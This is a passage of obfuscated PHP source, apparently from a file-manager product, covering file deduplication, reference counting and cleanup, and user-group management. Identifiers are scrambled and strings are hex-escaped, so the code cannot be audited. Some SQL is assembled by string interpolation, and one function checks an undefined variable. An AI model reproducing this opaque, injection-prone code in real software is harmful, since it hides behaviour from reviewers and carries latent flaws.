: ($ñ«‰Ä³Î ? substr($ñ«‰Ä³Î, 0, 5) : rand_string(5)); $üŞĞÈ‰É = $§İÒı . $´¢Ë¤ğü . $§ß¡ñõÈ . $ğ°Ä»ì‘[10] . $¥¾Ì©“½; } if (IO::isTypeObject($üŞĞÈ‰É) && !IO::isUploadServer($üŞĞÈ‰É)) { if (IO::exist($üŞĞÈ‰É)) { return $üŞĞÈ‰É; } $›£şó‚º = IO::setContent($üŞĞÈ‰É, $ğ°Ä»ì‘[12]); if (!$›£şó‚º) { show_json($ğ°Ä»ì‘[1947], !1); } } CacheLock::unlock($äİÓæ¦Ì); break; case $ğ°Ä»ì‘[1942]: break; default: break; } return $üŞĞÈ‰É; } public function addFileByRemote($¹íëö¿Ó, $‡Ó–ØÄü, $´¥íˆ­î = array()) { $£¹ºİ™ =& $_SERVER[—ÌÒğš÷]; if (!IO::exist($¹íëö¿Ó)) { return !1; } $¤Õ Î• = $´¥íˆ­î[$£¹ºİ™[641]] ? $´¥íˆ­î[$£¹ºİ™[641]] : $£¹ºİ™[12]; $ÃËÉ÷®˜ = IO::hashMd5($¹íëö¿Ó, $¤Õ Î•); $õ˜Å¶ì“ = KodIO::defaultDriver(); $ôúóºöÒ = array($£¹ºİ™[585] => IO::size($¹íëö¿Ó), $£¹ºİ™[1948] => 1, $£¹ºİ™[462] => $‡Ó–ØÄü, $£¹ºİ™[844] => $õ˜Å¶ì“[$£¹ºİ™[443]], $£¹ºİ™[463] => $¹íëö¿Ó, $£¹ºİ™[1949] => $´¥íˆ­î[$£¹ºİ™[640]] ? $´¥íˆ­î[$£¹ºİ™[640]] : IO::hashSimple($¹íëö¿Ó), $£¹ºİ™[1950] => $ÃËÉ÷®˜ ? $ÃËÉ÷®˜ : $¤Õ Î•); if ($ÏÛ¾·ª = $this->addFileCheckExist($ôúóºöÒ[$£¹ºİ™[640]], $ôúóºöÒ[$£¹ºİ™[641]], $ôúóºöÒ[$£¹ºİ™[76]])) { return $ÏÛ¾·ª; } return $this->addFileData($ôúóºöÒ); } private function addFileData($ñş¨¶ í) { $Ëï¼Øùê =& $_SERVER[—ÌÒğš÷]; if (!$ñş¨¶ í) { return !1; } $ñş¨¶ í[$Ëï¼Øùê[76]] = intval($ñş¨¶ í[$Ëï¼Øùê[76]]); if (!$ñş¨¶ í[$Ëï¼Øùê[76]] && strlen($ñş¨¶ í[$Ëï¼Øùê[640]]) > 32) { $ñş¨¶ í[$Ëï¼Øùê[76]] = intval(substr($ñş¨¶ í[$Ëï¼Øùê[640]], 32)); } $Åğ‚Î = $this->add($ñş¨¶ í); return $this->find($Åğ‚Î); } public function addFile($ÜğîÔò‘, $ÚĞû¼ëè, $‚í–ş = false) { $ö«éíæÀ =& $_SERVER[—ÌÒğš÷]; $üµàÎ†Æ = IO::hashSimple($ÜğîÔò‘); $¥ÅÌ­¦ = IO::size($ÜğîÔò‘); $İ¾Õâö = $¥ÅÌ­¦ <= 1024 * 1024 * 10 ? IO::hashMd5($ÜğîÔò‘) : $ö«éíæÀ[12]; $ü¨šßÃ = $ö«éíæÀ[1951] . $üµàÎ†Æ; CacheLock::lock($ü¨šßÃ); if ($İ¾Õâö && $üµàÎ†Æ) { $¥öò = $this->addFileCheckExist($üµàÎ†Æ, $İ¾Õâö, $¥ÅÌ­¦); if ($¥öò) { CacheLock::unlock($ü¨šßÃ); return $¥öò; } } $×íÔö†” = $this->addFileMake($ÜğîÔò‘, $¥ÅÌ­¦, $üµàÎ†Æ, $İ¾Õâö, $ÚĞû¼ëè, $‚í–ş); $ŸŒìÉß… = $this->addFileData($×íÔö†”); CacheLock::unlock($ü¨šßÃ); if (!$İ¾Õâö && $ŸŒìÉß…) { $this->fileMd5Check($ŸŒìÉß…); } return $ŸŒìÉß…; } private function fileMd5Check($³¶ùïÕ) { $°Å¢Èì =& $_SERVER[—ÌÒğš÷]; $ºÈĞ¸¶… = array($³¶ùïÕ[$°Å¢Èì[509]], $³¶ùïÕ[$°Å¢Èì[84]]); $…Ş«İ® = $°Å¢Èì[1952] . $³¶ùïÕ[$°Å¢Èì[84]]; $†ÙÌä°§ = $°Å¢Èì[1953] . $³¶ùïÕ[$°Å¢Èì[509]]; $ÍÈ—ˆ¸à = TaskQueue::add($°Å¢Èì[1954], $ºÈĞ¸¶…, $…Ş«İ®, $†ÙÌä°§); if (!$ÍÈ—ˆ¸à) { $this->fileMd5Set($³¶ùïÕ[$°Å¢Èì[509]], $³¶ùïÕ[$°Å¢Èì[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($ìàÆƒªè, $ÄøïáÙ«) { $¯¦™êÊå =& $_SERVER[—ÌÒğš÷]; $³å½ùçû = $this->find($ìàÆƒªè); if (!$³å½ùçû || $³å½ùçû[$¯¦™êÊå[641]]) { return; } $ÌÂ–ÕÒ¹ = IO::hashMd5($ÄøïáÙ«); if (!$ÌÂ–ÕÒ¹) { return $¯¦™êÊå[12]; } $this->where(array($¯¦™êÊå[509] => $ìàÆƒªè))->save(array($¯¦™êÊå[641] => $ÌÂ–ÕÒ¹)); } public function addFileMake($ ×®„™‡, $´×¸®ÇÅ, $ñêıÒè”, $Éê’›š, $‘Ãì¹¿è, $¥íˆ½ÄÚ) { $íŠÈ–µ =& $_SERVER[—ÌÒğš÷]; $’† × £ = $this->createFileName($‘Ãì¹¿è, $ñêıÒè”, $Éê’›š); $ÌˆéºœÆ = get_path_father($’† × £); $Ÿ‘™™ÄÙ = get_path_this($’† × £); if ($¥íˆ½ÄÚ) { $İ’ßš†Â = IO::move($ ×®„™‡, $ÌˆéºœÆ, !1, $Ÿ‘™™ÄÙ); } else { $İ’ßš†Â = IO::copy($ ×®„™‡, $ÌˆéºœÆ, !1, $Ÿ‘™™ÄÙ); } if (!$İ’ßš†Â) { return !1; } $äÌâìĞ = KodIO::defaultDriver(); $¡Ì±—“ü = array($íŠÈ–µ[585] => $´×¸®ÇÅ, $íŠÈ–µ[1948] => 1, $íŠÈ–µ[462] => $‘Ãì¹¿è, $íŠÈ–µ[844] => $äÌâìĞ[$íŠÈ–µ[443]], $íŠÈ–µ[463] => $’† × £, $íŠÈ–µ[1949] => $ñêıÒè”, $íŠÈ–µ[1950] => $Éê’›š); return $¡Ì±—“ü; } public function addFileCheckExist($¼›ÌÄµË, $¢¸¨î±ü, $„¿ÓÜó÷) { $ŒÒ¢®Œç =& $_SERVER[—ÌÒğš÷]; $ªà’Ğğõ = $this->findByHash($¼›ÌÄµË, $¢¸¨î±ü); if (!$ªà’Ğğõ) { return !1; } $’Üç™˜– = array($ŒÒ¢®Œç[1948] => intval($ªà’Ğğõ[$ŒÒ¢®Œç[1955]]) + 1, $ŒÒ¢®Œç[585] => $„¿ÓÜó÷); $this->where(array($ŒÒ¢®Œç[510] => $ªà’Ğğõ[$ŒÒ¢®Œç[509]]))->save($’Üç™˜–); return $ªà’Ğğõ; } public function remove($º¸Ïˆö) { $this->linkCountChange($º¸Ïˆö, !1); $this->clearEmpty(); return !0; } public function linkAdd($ØÔë“ÇÏ) { $this->linkCountChange($ØÔë“ÇÏ, !0); } public function linkCountChange($¢Âè¼á, $ª¼°šÀŞ) { $¤­ëŞ¥  =& $_SERVER[—ÌÒğš÷]; if (!$¢Âè¼á) { return; } if (!is_array($¢Âè¼á)) { $¢Âè¼á = array($¢Âè¼á); } $Ä­°ûÑŠ = array(); foreach ($¢Âè¼á as $·ú¯ô) { $¤ôù¯Åˆ = $·ú¯ô . $¤­ëŞ¥ [12]; if (!$Ä­°ûÑŠ[$¤ôù¯Åˆ]) { $Ä­°ûÑŠ[$¤ôù¯Åˆ] = 0; } $Ä­°ûÑŠ[$¤ôù¯Åˆ]++; } $Š¶ãµçê = array(); foreach ($Ä­°ûÑŠ as $·ú¯ô => $Èİ•÷–) { $¤ôù¯Åˆ = $Èİ•÷– . $¤­ëŞ¥ [12]; if (!$Š¶ãµçê[$¤ôù¯Åˆ]) { $Š¶ãµçê[$¤ôù¯Åˆ] = array(); } $Š¶ãµçê[$¤ôù¯Åˆ][] = $·ú¯ô; } foreach ($Š¶ãµçê as $Èİ•÷– => $ËÈ”–ú¿) { if (!$ËÈ”–ú¿) { continue; } $Èİ•÷– = $ª¼°šÀŞ ? $Èİ•÷– : -intval($Èİ•÷–); $¹ã€ÂÊ× = array($¤­ëŞ¥ [509] => array($¤­ëŞ¥ [7], $ËÈ”–ú¿)); if ($Èİ•÷– < 0) { $¹ã€ÂÊ×[$¤­ëŞ¥ [1955]] = array($¤­ëŞ¥ [1059], abs($Èİ•÷–)); } $this->where($¹ã€ÂÊ×)->setAdd($¤­ëŞ¥ [1955], $Èİ•÷–); } } public function findByHash($£°ë±³Ù, $Ö¤ÆÀ¹ú = false) { $‚»÷œ¢¼ =& $_SERVER[—ÌÒğš÷]; if (!$£°ë±³Ù && !$Ö¤ÆÀ¹ú) { return !1; } $–£ªÑÊ = array($‚»÷œ¢¼[1949] => $£°ë±³Ù); if ($Ö¤ÆÀ¹ú) { $–£ªÑÊ = array($‚»÷œ¢¼[1950] => $Ö¤ÆÀ¹ú); } return $this->order($‚»÷œ¢¼[1956])->where($–£ªÑÊ)->find(); } public function clearEmpty($âˆå¤» = 0) { $Ó¸à·Ğ =& $_SERVER[—ÌÒğš÷]; $ŠÁÆ¶ = time() - 3600 * 24 * $âˆå¤»; $Ì¤ÊĞßÔ = $Ó¸à·Ğ[1957] . $ŠÁÆ¶; $Ğ•¨¿õ’ = $this->where($Ì¤ÊĞßÔ)->select(); if (!$Ğ•¨¿õ’) { return; } $‚ãø­ß¥ = new Task($Ó¸à·Ğ[1958], $Ó¸à·Ğ[12], count($Ğ•¨¿õ’)); foreach ($Ğ•¨¿õ’ as $äÊÕû¨ì) { $‚ãø­ß¥->update(1); $this->resetFile($äÊÕû¨ì); } $‚ãø­ß¥->end(); } public function resetFile($”Öí•‰) { $š»ƒÌõ€ =& $_SERVER[—ÌÒğš÷]; $æ³²æ– = array($š»ƒÌõ€[510] => $”Öí•‰[$š»ƒÌõ€[509]]); $ ¦õÌŸÔ = Model($š»ƒÌõ€[1376])->where($æ³²æ–)->count(); $†šÓ¸¾û = Model($š»ƒÌõ€[1959])->where($æ³²æ–)->count(); $üÎôôÄğ = intval($ ¦õÌŸÔ) + intval($†šÓ¸¾û); if ($üÎôôÄğ == 0) { IO::remove($”Öí•‰[$š»ƒÌõ€[84]]); Model($š»ƒÌõ€[1960])->delete($”Öí•‰[$š»ƒÌõ€[509]]); $this->where($æ³²æ–)->delete(); $this->metaSet($”Öí•‰[$š»ƒÌõ€[509]], null, null); return; } if ($”Öí•‰[$š»ƒÌõ€[1955]] != $üÎôôÄğ) { $this->where($æ³²æ–)->save(array($š»ƒÌõ€[1948] => $üÎôôÄğ)); } } public function storageInfo($ù©Â©ã = false) { $ÓªŸİÁğ =& $_SERVER[—ÌÒğš÷]; $Ü“ê¾ = $this->count() + 0.0; $®Ëø¹â = 0; $±­­Üç = 1; $¤ï­™Ø° = 0; $çÛáç˜ë = 5000; for ($ñ•Ñ¬İÌ = 0; $ñ•Ñ¬İÌ < $Ü“ê¾; $ñ•Ñ¬İÌ = $ñ•Ñ¬İÌ + $çÛáç˜ë) { $Û‡óÎğş = $this->limit($ñ•Ñ¬İÌ, $ñ•Ñ¬İÌ + $çÛáç˜ë)->select(); foreach ($Û‡óÎğş as $‡ëË‰) { $±­­Üç += $‡ëË‰[$ÓªŸİÁğ[76]] * $‡ëË‰[$ÓªŸİÁğ[1955]]; $®Ëø¹â += $‡ëË‰[$ÓªŸİÁğ[76]] * ($‡ëË‰[$ÓªŸİÁğ[1955]] - 1); $¤ï­™Ø° += $‡ëË‰[$ÓªŸİÁğ[1955]]; } } $¦ÔØÉÔø = array($ÓªŸİÁğ[1961] => $±­­Üç, $ÓªŸİÁğ[1962] => $®Ëø¹â, $ÓªŸİÁğ[1963] => $®Ëø¹â / $±­­Üç, $ÓªŸİÁğ[80] => $Ü“ê¾, $ÓªŸİÁğ[1964] => $¤ï­™Ø°); return $¦ÔØÉÔø; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\x70"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\141\155\145" => "\x67\162\x6f\x75\160\137\x6d\145\x74\x61", "\x6d\145\164\141\106\151\145\x6c\144" => "\x67\162\x6f\x75\160\x49\x44"); protected function cacheFunctionAlias($øó÷í¾Ø) { $’¾—ÑÒ¶ =& $_SERVER[—ÌÒğš÷]; return array($’¾—ÑÒ¶[1965] => array($øó÷í¾Ø[0], $’¾—ÑÒ¶[1966]), $’¾—ÑÒ¶[1967] => array($øó÷í¾Ø[0], $’¾—ÑÒ¶[1968])); } protected function getInfo($Õ¨úİ, $‚ú„åáˆ = false) { $“Şü½Ë— = $this->getInfoSimple($Õ¨úİ); if (!$“Şü½Ë—) { return !1; } if ($‚ú„åáˆ) { return $this->_listDataApplyItem($“Şü½Ë—); } return $this->cacheFunctionGet($_SERVER[—ÌÒğš÷][1969], $Õ¨úİ); } protected function getInfoSimple($úÇòåœ…, $òÓš¸•Ì = false) { $±õÊõŠ =& $_SERVER[—ÌÒğš÷]; if ($òÓš¸•Ì) { $îàÏÎÏ” = array($±õÊõŠ[1887] => intval($úÇòåœ…)); $¬ûìûú÷ = $this->where($îàÏÎÏ”)->find(); return is_array($¬ûìûú÷) ? $¬ûìûú÷ : array(); } return $this->cacheFunctionGet($±õÊõŠ[1970], $úÇòåœ…); } protected function groupAdd($’æŠßøú) { $¸äş¿øş =& $_SERVER[—ÌÒğš÷]; if (!$’æŠßøú[$¸äş¿øş[180]] && isset($’æŠßøú[$¸äş¿øş[1887]]) && $’æŠßøú[$¸äş¿øş[1887]] == 1) { if ($òÛãŒ‡— = $this->getInfoSimple($’æŠßøú[$¸äş¿øş[1887]], !0)) { return $’æŠßøú[$¸äş¿øş[1887]]; } } else { $òÛãŒ‡— = $this->getInfoSimple($’æŠßøú[$¸äş¿øş[180]]); if (!$òÛãŒ‡—) { return !1; } } $™¥ßöÙ¼ = $¸äş¿øş[563]; if ($òÛãŒ‡—[$¸äş¿øş[553]]) { $™¥ßöÙ¼ = $òÛãŒ‡—[$¸äş¿øş[553]] . $òÛãŒ‡—[$¸äş¿øş[1887]] . $¸äş¿øş[50]; } $‘ı™¡Ù¸ = array($¸äş¿øş[462] => $this->groupNameAuto($’æŠßøú[$¸äş¿øş[180]], $’æŠßøú[$¸äş¿øş[32]]), $¸äş¿øş[445] => $’æŠßøú[$¸äş¿øş[180]], $¸äş¿øş[620] => $™¥ßöÙ¼, $¸äş¿øş[1971] => $’æŠßøú[$¸äş¿øş[1874]], $¸äş¿øş[1972] => 0, $¸äş¿øş[1891] => 0); if (isset($’æŠßøú[$¸äş¿øş[1911]])) { $‘ı™¡Ù¸[$¸äş¿øş[1911]] = $’æŠßøú[$¸äş¿øş[1911]]; } else { $Ùãºù¬¸ = $this->max($¸äş¿øş[1911]); if (!$Ùãºù¬¸) { $Ùãºù¬¸ = 0; } $‘ı™¡Ù¸[$¸äş¿øş[1911]] = $Ùãºù¬¸ + 1; } if (!empty($’æŠßøú[$¸äş¿øş[1887]])) { $‘ı™¡Ù¸[$¸äş¿øş[1887]] = $’æŠßøú[$¸äş¿øş[1887]]; } $¬¢®ÇÙ‚ = $this->add($‘ı™¡Ù¸); $this->setNamePinyin($¬¢®ÇÙ‚, $‘ı™¡Ù¸[$¸äş¿øş[32]]); if (isset($’æŠßøú[$¸äş¿øş[1973]])) { $this->metaSet($¬¢®ÇÙ‚, array($¸äş¿øş[1973] => $’æŠßøú[$¸äş¿øş[1973]], $¸äş¿øş[1974] => $’æŠßøú[$¸äş¿øş[1974]])); unset($’æŠßøú[$¸äş¿øş[1973]]); unset($’æŠßøú[$¸äş¿øş[1974]]); } Model($¸äş¿øş[1376])->groupRootAdd($¬¢®ÇÙ‚); $this->_clearCache($’æŠßøú[$¸äş¿øş[180]]); return $¬¢®ÇÙ‚; } protected function groupEdit($“ÆÌüİ, $àô¯•»í) { $¥òö´øò =& $_SERVER[—ÌÒğš÷]; $ıª–ø©¨ = $this->getInfoSimple($“ÆÌüİ); if (!$ıª–ø©¨) { return !1; } if (!empty($àô¯•»í[$¥òö´øò[180]])) { $èİÌÆ®§ = $this->getInfoSimple($àô¯•»í[$¥òö´øò[180]]); if (!$èİÌÆ®§) { return !1; } if ($ıª–ø©¨[$¥òö´øò[1887]] == $èİÌÆ®§[$¥òö´øò[1887]]) { return !1; } if ($àô¯•»í[$¥òö´øò[180]] != $ıª–ø©¨[$¥òö´øò[180]]) { if ($èİÌÆ®§[$¥òö´øò[553]] !== $ıª–ø©¨[$¥òö´øò[553]] && strpos($èİÌÆ®§[$¥òö´øò[553]], $ıª–ø©¨[$¥òö´øò[553]] . $ıª–ø©¨[$¥òö´øò[1887]] . $¥òö´øò[50]) === 0) { return !1; } $àô¯•»í[$¥òö´øò[620]] = $èİÌÆ®§[$¥òö´øò[553]] . $àô¯•»í[$¥òö´øò[180]] . $¥òö´øò[50]; $this->_changeChildLevel($ıª–ø©¨, $èİÌÆ®§); $this->_clearCache($èİÌÆ®§[$¥òö´øò[1887]]); $this->_clearCache($ıª–ø©¨[$¥òö´øò[180]]); } } if (isset($àô¯•»í[$¥òö´øò[32]])) { $this->setNamePinyin($“ÆÌüİ, $àô¯•»í[$¥òö´øò[32]]); } if (isset($àô¯•»í[$¥òö´øò[1973]])) { $this->metaSet($“ÆÌüİ, array($¥òö´øò[1973] => $àô¯•»í[$¥òö´øò[1973]], $¥òö´øò[1974] => $àô¯•»í[$¥òö´øò[1974]])); unset($àô¯•»í[$¥òö´øò[1973]]); unset($àô¯•»í[$¥òö´øò[1974]]); } $this->_clearChildrenCache($ıª–ø©¨); return $this->where(array($¥òö´øò[1975] => $“ÆÌüİ))->save($àô¯•»í); } private function _clearChildrenCache($ù£Åƒ—) { $øÖÑÑ± =& $_SERVER[—ÌÒğš÷]; $‚úêô³í = array($øÖÑÑ±[620] => array($øÖÑÑ±[580], $ù£Åƒ—[$øÖÑÑ±[553]] . $ù£Åƒ—[$øÖÑÑ±[1887]] . $øÖÑÑ±[581])); $áİ°ÀæÄ = $this->field($øÖÑÑ±[1887])->where($‚úêô³í)->select(); foreach ($áİ°ÀæÄ as $†Ùì¨ñŞ) { $this->_clearCache($†Ùì¨ñŞ[$øÖÑÑ±[1887]]); } } private function _clearCache($¡º¸”ê) { $®ğĞÎ£ü =& $_SERVER[—ÌÒğš÷]; $this->cacheFunctionClear($®ğĞÎ£ü[1969], $¡º¸”ê); $this->cacheFunctionClear($®ğĞÎ£ü[1970], $¡º¸”ê); } private function _changeChildLevel($‰”á‚„÷, $ÇãàÑ§â, $É¶ŒÒ‹¬ = false) { $ °€¹§¬ =& $_SERVER[—ÌÒğš÷]; $°”šË€† = $‰”á‚„÷[$ °€¹§¬[553]] . $‰”á‚„÷[$ °€¹§¬[1887]] . $ °€¹§¬[50]; $š²¢Ã¹ş = $ÇãàÑ§â[$ °€¹§¬[553]] . $ÇãàÑ§â[$ °€¹§¬[1887]] . $ °€¹§¬[50] . $‰”á‚„÷[$ °€¹§¬[1887]] . $ °€¹§¬[50]; if ($É¶ŒÒ‹¬) { $š²¢Ã¹ş = $ÇãàÑ§â[$ °€¹§¬[553]] . $ÇãàÑ§â[$ °€¹§¬[1887]] . $ °€¹§¬[50]; } $»·’²±á = array($ °€¹§¬[620] => array($ °€¹§¬[580], $‰”á‚„÷[$ °€¹§¬[553]] . $‰”á‚„÷[$ °€¹§¬[1887]] . $ °€¹§¬[581])); $±îĞùÓ = array($ °€¹§¬[620] => array($ °€¹§¬[629], "\162\x65\160\x6c\141\x63\x65\50\160\x61\x72\x65\x6e\x74\x4c\x65\x76\145\154\x2c\47{$°”šË€†}\47\54\x27{$š²¢Ã¹ş}\47\51")); $this->_clearChildrenCache($‰”á‚„÷); $this->where($»·’²±á)->data($±îĞùÓ)->save(); } public function setNamePinyin($’¼’­¸Ğ, $ú¿†®şÈ = false) { $Ñİ¾¡ÔÇ =& $_SERVER[—ÌÒğš÷]; if (!$ú¿†®şÈ) { $åŠÕŸ•‡ = $this->getInfoSimple($’¼’­¸Ğ); $ú¿†®şÈ = $åŠÕŸ•‡[$Ñİ¾¡ÔÇ[32]]; } if (!Input::check($ú¿†®şÈ, $Ñİ¾¡ÔÇ[623])) { $this->metaSet($’¼’­¸Ğ, $Ñİ¾¡ÔÇ[506], null); $this->metaSet($’¼’­¸Ğ, $Ñİ¾¡ÔÇ[505], null); return; } $‚©£Šœù = array($Ñİ¾¡ÔÇ[506] => str_replace($Ñİ¾¡ÔÇ[53], $Ñİ¾¡ÔÇ[12], Pinyin::get($ú¿†®şÈ)), $Ñİ¾¡ÔÇ[505] => Pinyin::get($ú¿†®şÈ, $Ñİ¾¡ÔÇ[624])); $this->metaSet($’¼’­¸Ğ, $‚©£Šœù); } protected function groupStatus($¨·å§ª, $Áùˆ²í…) { $ÉÎ¨Şã =& $_SERVER[—ÌÒğš÷]; $¨Öı¿– = $this->getInfoSimple($¨·å§ª); if (!$¨Öı¿–) { return !1; } if ($Áùˆ²í… == $ÉÎ¨Şã[88]) { $êÓ· = $this->parentLevelArray($¨Öı¿–[$ÉÎ¨Şã[553]]); } else { $³ç›á¦ = array($ÉÎ¨Şã[620] => array($ÉÎ¨Şã[580], $¨Öı¿–[$ÉÎ¨Şã[553]] . $¨Öı¿–[$ÉÎ¨Şã[1887]] . $ÉÎ¨Şã[581])); $êÓ· = $this->where($³ç›á¦)->field($ÉÎ¨Şã[1887])->select(); $êÓ· = array_to_keyvalue($êÓ·, $ÉÎ¨Şã[12], $ÉÎ¨Şã[1887]); } $êÓ·[] = $¨Öı¿–[$ÉÎ¨Şã[1887]]; $®¶õ­ˆì = array(); foreach ($êÓ· as $¨·å§ª) { $®¶õ­ˆì[] = array($ÉÎ¨Şã[1887] => $¨·å§ª, $ÉÎ¨Şã[94] => $ÉÎ¨Şã[786], $ÉÎ¨Şã[418] => $Áùˆ²í…); $this->_clearCache($¨·å§ª); } return Model($ÉÎ¨Şã[1976])->addAll($®¶õ­ˆì, array(), !0); } protected function groupRemove($Ê„¹¦Üú, $œßŸü£ = false) { $‘”Õüüï =& $_SERVER[—ÌÒğš÷]; $ô•øçäÙ = array($‘”Õüüï[1887] => $Ê„¹¦Üú); $í«µ¼öÒ = $this->where($ô•øçäÙ)->find(); if (!$í«µ¼öÒ || $í«µ¼öÒ[$‘”Õüüï[180]] == 0) { return !1; } if (!$œßŸü£) { $¾Úíµ«¾ = $this->getInfoSimple($í«µ¼öÒ[$‘”Õüüï[180]]); $this->_changeChildLevel($í«µ¼öÒ, $¾Úíµ«¾, !0); $this->where(array($‘”Õüüï[180] => $Ê„¹¦Üú))->save(array($‘”Õüüï[180] => $í«µ¼öÒ[$‘”Õüüï[180]])); $this->_clearCache($¾Úíµ«¾[$‘”Õüüï[1887]]); } Model($‘”Õüüï[1976])->where($ô•øçäÙ)->delete(); Model($‘”Õüüï[1977])->where($ô•øçäÙ)->delete(); Model($‘”Õüüï[861])->groupRootRemove($Ê„¹¦Üú); $this->_clearCache($í«µ¼öÒ[$‘”Õüüï[180]]); return $this->where($ô•øçäÙ)->delete(); } protected function groupSort($®Ïè¹˜Ü) { $–úú¬» =& $_SERVER[—ÌÒğš÷]; $şˆ‰©¶ = array(); foreach ($®Ïè¹˜Ü as $òÈ‚¤ => $©çÅÆ¶Æ) { $şˆ‰©¶[] = array($–úú¬»[1887], $©çÅÆ¶Æ, $–úú¬»[1911], $òÈ‚¤ + 1); } $this->saveAll($şˆ‰©¶); } public function listData() { $‡ñùáß = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‡ñùáß[$_SERVER[—ÌÒğš÷][413]]); return $‡ñùáß; } private function _makeOrder($É™ËÁò° = '') { $ë•Â•Ùì =& $_SERVER[—ÌÒğš÷]; $òº‰­Ëû = array($ë•Â•Ùì[1887], $ë•Â•Ùì[32], $ë•Â•Ùì[1876], $ë•Â•Ùì[215]); $½†èÕöî = array($ë•Â•Ùì[491] => $ë•Â•Ùì[492], $ë•Â•Ùì[493] => $ë•Â•Ùì[494]); $ü«ıÁ¤Ù = Input::get($ë•Â•Ùì[498], $ë•Â•Ùì[7], $ë•Â•Ùì[1891], $òº‰­Ëû); $âîŒÍ¼˜ = Input::get($ë•Â•Ùì[499], $ë•Â•Ùì[7], $ë•Â•Ùì[1978], array($ë•Â•Ùì[1978], $ë•Â•Ùì[493])); $âîŒÍ¼˜ = $½†èÕöî[$âîŒÍ¼˜]; $É™ËÁò° = $É™ËÁò° . "{$ü«ıÁ¤Ù}\x20{$âîŒÍ¼˜}\54\40\x67\162\157\165\x70\x49\x44\x20\141\163\143"; return $this->order($É™ËÁò°); } public function listChild($¾‘ü“µ¬) { $ıôÒ¾—ì =& $_SERVER[—ÌÒğš÷]; $õø‰ Ä = $this->where(array($ıôÒ¾—ì[180] => $¾‘ü“µ¬))->_makeOrder()->selectPage(200); $this->_listDataApply($õø‰ Ä[$ıôÒ¾—ì[413]]); return $õø‰ Ä; } public function listChildIds($¤ÚÌ™¸ë) { $ø€ô‰æ =& $_SERVER[—ÌÒğš÷]; if (is_string($ã¤†›ÕÈ)) { $¤ÚÌ™¸ë = explode($ø€ô‰æ[50], $¤ÚÌ™¸ë); } $šâ»Â‰Ä = $this->where(array($ø€ô‰æ[1887] => array($ø€ô‰æ[7], $¤ÚÌ™¸ë)))->field($ø€ô‰æ[1979])->select(); if (!$šâ»Â‰Ä) { return !1; } $ıêİèë‹ = array(); foreach ($šâ»Â‰Ä as $çï­×ı») { $ıêİèë‹[] = "\163\x65\154\145\x63\x74\x20\147\x72\157\165\x70\x49\x44\40\146\162\157\155\x20\x60\147\162\x6f\165\x70\140\40\167\x68\x65\x72\145\x20\x70\x61\162\145\156\164\x4c\x65\166\x65\154\x20\154\x69\153\145\x20\x27{$çï­×ı»[$ø€ô‰æ[553]]}{$çï­×ı»[$ø€ô‰æ[1887]]}\54\x25\47"; } $ıêİèë‹ = implode($ø€ô‰æ[1980], $ıêİèë‹); $šâ»Â‰Ä = $this->query($ıêİèë‹); if (!$šâ»Â‰Ä) { return array(); } $¤ÚÌ™¸ë = array_to_keyvalue($šâ»Â‰Ä, $ø€ô‰æ[12], $ø€ô‰æ[1887]); return array_unique($¤ÚÌ™¸ë); } public function listByID($‘ØáòÛÜ) { $òé™›‡ù =& $_SERVER[—ÌÒğš÷]; if (!$‘ØáòÛÜ) { return array(); } $Æ«ŠÓúÎ = array($òé™›‡ù[1887] => array($òé™›‡ù[7], $‘ØáòÛÜ)); $ò‰Û…ûû = $this->where($Æ«ŠÓúÎ)->select(); $ò‰Û…ûû = array_sort_keep($ò‰Û…ûû, $òé™›‡ù[1887], $‘ØáòÛÜ); $this->_listDataApply($ò‰Û…ûû); return $ò‰Û…ûû; } public function listSearch($ß“Ñ÷ı) { $Õº§†«– =& $_SERVER[—ÌÒğš÷]; $ëÒÆ™«° = $ß“Ñ÷ı[$Õº§†«–[1981]]; $Å˜Îï°Ú = isset($ß“Ñ÷ı[$Õº§†«–[1982]]) ? $ß“Ñ÷ı[$Õº§†«–[1982]] : !1; if (!trim($ëÒÆ™«°)) { return !1; } $ëÒÆ™«° = str_replace($Õº§†«–[1983], $Õº§†«–[1984], $ëÒÆ™«°); $£ŒÂÙÒ¿ = array($Õº§†«–[1887] => array($Õº§†«–[427], "{$ëÒÆ™«°}\x25"), $Õº§†«–[32] => array($Õº§†«–[427], "\x25{$ëÒÆ™«°}\x25"), $Õº§†«–[1044] => $Õº§†«–[1985]); if ($Å˜Îï°Ú) { $ÀÇİöÉ = $this->getInfoSimple($Å˜Îï°Ú); $Š„‡çñ¢ = $ÀÇİöÉ[$Õº§†«–[553]] . $Å˜Îï°Ú . $Õº§†«–[581]; $£ŒÂÙÒ¿ = array($£ŒÂÙÒ¿, array($Õº§†«–[553] => array($Õº§†«–[427], $Š„‡çñ¢))); } $£ŒÂÙÒ¿ = $this->parseWhereLike($£ŒÂÙÒ¿); $–ªÆÒ§” = $this->_makeOrder()->where($£ŒÂÙÒ¿)->selectPage(20); $–ªÆÒ§” = $–ªÆÒ§” ? $–ªÆÒ§” : array($Õº§†«–[413] => array(), $Õº§†«–[410] => array()); if (!$–ªÆÒ§” || count($–ªÆÒ§”[$Õº§†«–[413]]) < 5 && Input::check($ëÒÆ™«°, $Õº§†«–[362])) { $¢¯Ûë”Ÿ = $this->groupChildrenAll($Å˜Îï°Ú); $ƒ¹‡Ùñ“ = $this->_searchFromMeta($Õº§†«–[505], $ëÒÆ™«°, 10, $¢¯Ûë”Ÿ); $Ô¦şø‘× = $this->_searchFromMeta($Õº§†«–[506], $ëÒÆ™«°, 10, $¢¯Ûë”Ÿ); $âÄú¦µÈ = array_merge($ƒ¹‡Ùñ“, $Ô¦şø‘×, $–ªÆÒ§”[$Õº§†«–[413]]); $–ªÆÒ§”[$Õº§†«–[413]] = array_unique_by_key($âÄú¦µÈ, $Õº§†«–[1887]); $–ªÆÒ§”[$Õº§†«–[410]][$Õº§†«–[411]] = count($–ªÆÒ§”[$Õº§†«–[413]]); $–ªÆÒ§”[$Õº§†«–[410]][$Õº§†«–[412]] = ceil($–ªÆÒ§”[$Õº§†«–[410]][$Õº§†«–[411]] / $–ªÆÒ§”[$Õº§†«–[410]][$Õº§†«–[407]]); } $this->_listDataApply($–ªÆÒ§”[$Õº§†«–[413]]); return $–ªÆÒ§”; } protected function groupChildrenAll($Û”ÎÉà›) { $àÈÍ³…Ş =& $_SERVER[—ÌÒğš÷]; if (!$Û”ÎÉà›) { return !1; } if (is_string($Û”ÎÉà›)) { $Û”ÎÉà› = array($Û”ÎÉà›); } $˜‹²’„¿ = 